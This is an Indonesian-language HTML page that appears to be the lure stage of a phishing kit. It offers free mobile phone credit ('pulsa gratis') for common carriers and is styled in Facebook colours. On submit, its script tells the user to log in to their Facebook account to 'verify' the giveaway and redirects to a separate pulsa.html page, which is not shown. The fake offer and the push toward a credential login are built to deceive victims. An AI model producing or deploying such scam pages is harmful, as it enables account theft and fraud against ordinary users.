<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Isi Data Pulsa Gratis</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1877f2, #42b72a);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    h2 {
      color: #1877f2;
      margin-bottom: 20px;
    }
    input, select {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 10px;
    }
    button {
      background: #42b72a;
      color: white;
      font-size: 18px;
      padding: 14px;
      width: 100%;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
      margin-top: 15px;
    }
    button:hover {
      background: #36a420;
    }
    .note {
      font-size: 14px;
      margin-top: 12px;
      color: gray;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>Dapatkan Pulsa Gratis!</h2>
    <form id="pulsaForm">
      <input type="tel" name="nomor" id="nomor" placeholder="Masukkan Nomor HP" required>
      
      <select name="jumlah" id="jumlah" required>
        <option value="">Pilih Jumlah Pulsa</option>
        <option value="5000">Rp 5.000</option>
        <option value="10000">Rp 10.000</option>
        <option value="20000">Rp 20.000</option>
        <option value="50000">Rp 50.000</option>
      </select>

      <select name="provider" id="provider" required>
        <option value="">Pilih Provider</option>
        <option value="Telkomsel">Telkomsel</option>
        <option value="Indosat">Indosat</option>
        <option value="Tri">Tri (3)</option>
        <option value="XL">XL Axiata</option>
        <option value="Axis">Axis</option>
        <option value="Smartfren">Smartfren</option>
      </select>

      <button type="submit">Lanjutkan</button>
    </form>
    <div class="note">*Pulsa akan dikirim setelah proses verifikasi selesai</div>
  </div>

  <script>
    document.getElementById('pulsaForm').addEventListener('submit', function(e) {
      e.preventDefault();

      // Validasi (opsional)
      const nomor = document.getElementById('nomor').value;
      const jumlah = document.getElementById('jumlah').value;
      const provider = document.getElementById('provider').value;

      if (!nomor || !jumlah || !provider) {
        alert("Semua kolom harus diisi!");
        return;
      }

      // Alert sebelum lanjut
      alert("Lanjut untuk memverifikasi dan login ke akun Facebook untuk mendapatkan pulsa dan pulsa akan dikirim setelah login selesai.");

      // Arahkan ke halaman pulsa.html
      window.location.href = "pulsa.html";
    });
  </script>

</body>
</html>
